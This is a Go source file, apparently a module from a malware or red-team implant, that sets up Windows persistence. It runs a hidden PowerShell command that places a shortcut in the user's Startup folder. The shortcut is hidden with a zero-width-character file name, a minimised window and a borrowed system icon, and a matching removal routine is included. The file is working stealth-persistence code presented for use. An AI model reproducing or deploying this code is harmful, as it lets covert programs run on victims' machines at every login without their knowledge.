package install

import (
	"errors"
	"fmt"
	"os/exec"
	"strings"
	"syscall"
)

const (
	createCmd = "$w=New-Object -C WScript.Shell;$u=$w.SpecialFolders('Startup')+'\\';$s=$w.CreateShortcut($u+'.lnk');$s.TargetPath='%s';$s.IconLocation='shell32.dll,50';$s.WindowStyle=7;$s.Save();Rename-Item $u'.lnk' ($u+[char]0x200b+'.lnk')"
	removeCmd = "$w=New-Object -C WScript.Shell;$u=$w.SpecialFolders('Startup')+'\\';Remove-Item ($u+[char]0x200b+'.lnk')"
)

//TryFolderInstall attempts to establish persistence by creating a startup shortcut.
func TryFolderInstall() error {
	cmd := exec.Command("powershell", fmt.Sprintf(createCmd, "powershell.exe"))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()

	if strings.Contains(string(out), "FullyQualifiedErrorId") {
		return errors.New("Failed to create shortcut")
	}
	return err
}

func UninstallFolder() error {
	cmd := exec.Command("powershell", removeCmd)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()

	if strings.Contains(string(out), "FullyQualifiedErrorId") {
		return errors.New("Failed to remove shortcut")
	}
	return err
}
